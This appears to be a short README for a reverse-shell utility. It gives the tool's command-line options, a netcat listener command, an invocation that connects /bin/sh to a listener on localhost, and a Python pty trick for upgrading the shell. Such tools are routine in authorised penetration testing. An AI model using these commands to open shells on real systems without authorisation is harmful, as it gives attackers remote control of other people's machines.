# reverse-shell

A simple reverse shell

## Usage

```
usage: reverse-shell [options] <host> <port>
options:
	-h         : display this and exit
	-v         : display version and exit
	-f         : foreground mode (eg: no fork)
	-4         : use IPv4 socket
	-6         : use IPv6 socket
	-s <shell> : give the path shell (default: /bin/sh)
```

## Example

On the 'client' side, we create the listener :
```
nc -lp 4445
```
or
```
./reverse-listener 127.0.0.1 4445
```

On the 'server' side, we bind the shell to the listener :
```
./reverse-shell 127.0.0.1 4445
```

## Tip
Once you have the shell, if you want to be more confortable :
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
